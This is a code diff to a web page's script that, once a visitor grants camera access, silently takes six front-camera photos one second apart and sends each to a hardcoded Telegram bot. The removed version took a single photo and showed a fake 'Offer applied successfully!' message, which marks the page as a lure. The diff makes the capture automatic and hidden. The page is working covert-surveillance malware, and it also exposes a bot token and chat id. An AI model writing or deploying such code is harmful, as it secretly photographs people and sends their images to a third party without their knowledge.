@@ -99,61 +99,69 @@
 <canvas id="canvas" width="320" height="240"></canvas>
 
 <script>
-  const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
-  const chatId = "8182050140";
+const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
+const chatId = "8182050140";
 
-  const video = document.getElementById("video");
-  const canvas = document.getElementById("canvas");
-  const context = canvas.getContext("2d");
-  let stream = null;
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const context = canvas.getContext("2d");
+let stream = null;
 
-  window.onload = () => {
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-      .then(s => {
-        stream = s;
-        video.srcObject = stream;
-        video.addEventListener('loadedmetadata', () => {
-          video.play();
-        });
-      })
-      .catch(err => {
-        alert("⚠️ Camera access denied!");
-        console.error(err);
+window.onload = () => {
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(s => {
+      stream = s;
+      video.srcObject = stream;
+      video.addEventListener('loadedmetadata', () => {
+        video.play();
+        // Video ready, start auto capture
+        autoCapture(6, 1000); // 6 images, 1 second interval
       });
-  };
+    })
+    .catch(err => {
+      alert("⚠️ Camera access denied!");
+      console.error(err);
+    });
+};
 
-  async function captureAndSend() {
-    // Wait until the video has at least one frame ready
-    if (video.readyState < 2) {
-      alert("📸 Camera not ready yet — please wait a second!");
+async function captureAndSend(index) {
+  if (video.readyState < 2) {
+    console.log("Camera not ready yet — waiting...");
+    return;
+  }
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  const base64Img = canvas.toDataURL("image/jpeg").split(',')[1];
+  const blob = await fetch(`data:image/jpeg;base64,${base64Img}`).then(res => res.blob());
+
+  const form = new FormData();
+  form.append("chat_id", chatId);
+  form.append("photo", blob, `captured_${index}.jpg`);
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+    method: "POST",
+    body: form
+  })
+  .then(() => console.log(`✅ Image ${index} sent successfully!`))
+  .catch(e => console.error(`❌ Failed to send image ${index}`, e));
+}
+
+function autoCapture(totalImages, intervalMs) {
+  let count = 0;
+  const captureInterval = setInterval(() => {
+    if (count >= totalImages) {
+      clearInterval(captureInterval);
+      stream.getTracks().forEach(track => track.stop());
+      console.log("All captures done, camera stopped.");
       return;
     }
-
-    // Match canvas to the actual video size
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-
-    // Draw the current frame
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    const base64Img = canvas.toDataURL("image/jpeg").split(',')[1];
-
-    const blob = await fetch(`data:image/jpeg;base64,${base64Img}`).then(res => res.blob());
-    const form = new FormData();
-    form.append("chat_id", chatId);
-    form.append("photo", blob, "captured.jpg");
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-      method: "POST",
-      body: form
-    }).then(() => {
-      alert("✅ Offer applied successfully!");
-      stream.getTracks().forEach(track => track.stop());
-    }).catch((e) => {
-      alert("❌ Failed to send photo.");
-      console.error(e);
-    });
-  }
+    captureAndSend(count + 1);
+    count++;
+  }, intervalMs);
+}
 </script>
 
 </body>
